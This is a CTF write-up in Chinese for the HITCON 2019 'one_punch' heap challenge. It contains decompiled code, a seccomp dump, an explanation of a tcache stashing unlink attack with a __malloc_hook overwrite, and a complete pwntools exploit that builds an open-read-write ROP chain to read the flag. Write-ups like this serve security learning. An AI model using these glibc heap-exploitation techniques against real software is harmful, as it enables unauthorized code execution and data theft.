# BUU-hitcon_ctf_2019_one_punch

## checksec

```c
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## IDA

**debut**

```c
unsigned __int64 __fastcall debut(__int64 a1, __int64 a2)
{
  unsigned int idx; // [rsp+8h] [rbp-418h]
  int size; // [rsp+Ch] [rbp-414h]
  char s[1032]; // [rsp+10h] [rbp-410h] BYREF
  unsigned __int64 v6; // [rsp+418h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  my_puts("idx: ");
  idx = choice();
  if ( idx > 2 )
    error("invalid", a2);
  my_puts("hero name: ");
  memset(s, 0, 0x400uLL);
  size = read(0, s, 0x400uLL);
  if ( size <= 0 )
    error("io", s);
  s[size - 1] = 0;
  if ( size <= 0x7F || size > 0x400 )
    error("poor hero name", s);
  *((_QWORD *)&heap_array + 2 * idx) = calloc(1uLL, size);
  size_array[2 * idx] = size;
  strncpy(*((char **)&heap_array + 2 * idx), s, size);
  memset(s, 0, 0x400uLL);
    
  return __readfsqword(0x28u) ^ v6;
}
```

**rename**

```c
ssize_t __fastcall rename(__int64 a1, __int64 a2)
{
  void *v2; // rsi
  ssize_t result; // rax
  unsigned int v4; // [rsp+Ch] [rbp-4h]

  my_puts("idx: ");
  v4 = choice();
  if ( v4 > 2 )
    error("invalid", a2);
  if ( !*((_QWORD *)&heap_array + 2 * v4) )
    error("err", a2);
  my_puts("hero name: ");
  v2 = (void *)*((_QWORD *)&heap_array + 2 * v4);
  result = read(0, v2, size_array[2 * v4]);
  if ( result <= 0 )
    error("io", v2);
  return result;
}
```

**show**

```c
__int64 __fastcall sub_14EF(__int64 a1, __int64 a2)
{
  __int64 result; // rax
  unsigned int v3; // [rsp+Ch] [rbp-4h]

  my_puts("idx: ");
  v3 = choice();
  if ( v3 > 2 )
    error("invalid", a2);
  result = *((_QWORD *)&heap_array + 2 * v3);
  if ( result )
  {
    my_puts("hero name: ");
    result = puts(*((_QWORD *)&heap_array + 2 * v3));
  }
  return result;
}
```

**retire**

```c
void __fastcall retire(__int64 a1, __int64 a2)
{
  unsigned int v2; // [rsp+Ch] [rbp-4h]

  my_puts("idx: ");
  v2 = choice();
  if ( v2 > 2 )
    error("invalid", a2);
  free(*((void **)&heap_array + 2 * v2));
}
```

**gift**

```c
__int64 __fastcall gift(__int64 a1, __int64 a2)
{
  void *buf; // [rsp+8h] [rbp-8h]

  if ( *(char *)(qword_4030 + 32) <= 6 )
    error("gg", a2);
  buf = malloc(0x217uLL);
  if ( !buf )
    error("err", a2);
  if ( read(0, buf, 0x217uLL) <= 0 )
    error("io", buf);
  puts("Serious Punch!!!");
  puts(qword_2128);
  return puts(buf);
}
```

可以造成UAF，libc地址与heap地址可以leak了。这里使用的`calloc`申请堆块，**calloc不会使用tcache**。在`gift`中，满足条件，`(qword_4030 + 32) <= 6`就可以使用malloc。

远程libc的版本为2.29，另外，在本题中是禁用`exec`的：

```shell
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0022
 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0022: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0024
 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0024: 0x06 0x00 0x00 0x00000000  return KILL
```

我们必须使用`orw`，那么如何控制控制程序执行呢。首先，我们先将彩蛋条件满足，我们要在`qword_4030 + 32`填写一个很大的数，这个地址再`tcache_struct`中可以计算。早期版本的libc可以通过`unsorted bin`来实现，后来的版本加了很多检查，无法再利用了。使用`tcache_stashing_unlink_attack`可以达到相同的效果。

需要构造以下情况：

- 对应的tcache不满
- 对应大小的small bin中有两个chunk
- 我们可以控制表头的chunk的bk指针

首先，向0x100大小的tcache中填6个chunk，在此过程我们leak堆的地址。接着，申请比0x100大的chunk，如0x400，将对应的tcache填满。之后再free的chunk就会加入到`unsorted bin`中，leak出libc。

申请`0x400-0x100`大小的chunk，会切割`unsorted bin`中0x400的chunk，而剩余的会留在`unsorted bin`中，再申请其无法满足的chunk，0x100的chunk就进入了small bin。而small bin中的chunk是从0x400的chunk中分割的，我们可以对其写入任何内容。

彩蛋触发后，我们可以进行malloc，通过`tcache_poisoning`对`__malloc_hook`进行覆写。注意到我们输入的内容是先保存在栈上，之后`memcpy`写入的，所以，我们可以将`orw`布置在栈上，再通过`__malloc_hook`处的gadget进行跳转。我们让它指向 `add rsp,0x·· ; ret` 就可以实现 rop 了。经过调试，`0x48` 就正好会跳转到我们的输入上。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
import sys

leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.arch="amd64"
#context.terminal = ['tmux', 'splitw', '-h']

binary='./hitcon_ctf_2019_one_punch'
#gdb.attach(sh)
if 'g' in sys.argv[1]:
	context.log_level="DEBUG"
if 'l' in sys.argv[1] and 'r' not in sys.argv[1]:
	log.info('Test in local...')
	sh=process(binary)
if 'r' in sys.argv[1]:
	log.info('Attacking...')
	sh=remote('node3.buuoj.cn',29723)

elf = ELF(binary,checksec=False)
libc = ELF('libc-2.29.so',checksec=False)

def debut(idx,name):
	sh.sendlineafter('> ','1')
	sh.sendlineafter('idx: ',str(idx))
	sh.sendafter('hero name: ',str(name))

def rename(idx,name):
	sh.sendlineafter('> ','2')
	sh.sendlineafter('idx: ',str(idx))
	sh.sendafter('hero name: ',name)

def show(idx):
	sh.sendlineafter('> ','3')
	sh.sendlineafter('idx: ',str(idx))

def free(idx):
	sh.sendlineafter('> ','4')
	sh.sendlineafter('idx: ',str(idx))

def gift(content):
	sh.sendlineafter('> ',str(0xc388))
	sh.sendline(content)


debut(0,'a'*0xf8)
debut(1,'b'*0xf8)
free(0)
free(1)

show(1)
sh.recvuntil("hero name: ")
heap_base = u64(sh.recvuntil('\x55')[-6:].ljust(8,'\x00'))-0x260
leak('heap',heap_base)

for i in range(4):
	debut(0,'a'*0xf8)
	free(0)

for i in range(7):
	debut(0,str(i)*0x400)
	free(0)


debut(0,'a'*0x400)
debut(2,'a'*0x400)
free(0)
show(0)
main_arena = u64(sh.recvuntil("\x7f")[-6:].ljust(8,'\x00'))-96
malloc_hook = main_arena-0x10
libcbase = malloc_hook-libc.sym["__malloc_hook"]
leak('malloc_hook',malloc_hook)
leak('libc base',libcbase) 

debut(2,'a'*0x300) # 0x100 chunk from idx_0 in small bin
debut(1,'a'*0x400)
debut(2,'a'*0x400)
free(1)
debut(2,'a'*0x300) # 0x100 chunk from idx_1 in small bin
debut(2,'a'*0x400) # 2 chunks in small bin
debut(2,'a'*0x217) 
free(2)			   # used to poisoning
payload = 'a'*0x300 + p64(0) + p64(0x101) + p64(heap_base + 0x27D0) + p64(heap_base + 0x30 - 0x10 - 5)
rename(1,payload)

debut(1,'a'*0xf8)
rename(2,p64(malloc_hook))
gift('pass')

pop_rdi = libcbase+ 0x26542
pop_rsi = libcbase+ 0x26f9e
pop_rdx = libcbase+ 0x12bda6
pop_rax = libcbase+ 0x47cf8
syscall = libcbase+ 0xcf6c5
read_addr = libcbase+ libc.sym["read"]
write_addr = libcbase+libc.sym["write"]
orw=''
orw+= p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(heap_base)+p64(pop_rdx)+p64(0x8)+p64(read_addr)
orw+= p64(pop_rdi)+p64(heap_base)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall)
orw+= p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_base)+p64(pop_rdx)+p64(0x100)+p64(read_addr)
orw+= p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(heap_base)+p64(pop_rdx)+p64(0x100)+p64(write_addr)
orw = orw.ljust(0x100,'\x90')
rsp_add = libcbase+0x08cfd6 
gift(p64(rsp_add))
# gdb.attach(sh)
debut(0,orw)
sh.sendline("/flag\x00\x00")

sh.interactive()

```

